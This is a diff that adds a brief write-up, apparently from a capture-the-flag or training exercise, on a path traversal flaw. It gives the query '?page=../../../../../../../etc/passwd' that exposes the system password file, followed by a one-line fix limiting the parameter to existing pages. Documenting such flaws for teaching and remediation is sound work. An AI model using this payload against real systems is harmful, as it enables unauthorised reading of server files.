@@ -1,0 +1,8 @@
+Tried a lot and I try ?page=../../../../../../../etc/ which give me "You can DO it !!!  :]"
+
+Into the url, use this query ?page=../../../../../../../etc/passwd
+
+This will be display /etc/passpwd file
+
+Resolution :
+    Block page query to only existing page and not enable to open file directly like that.
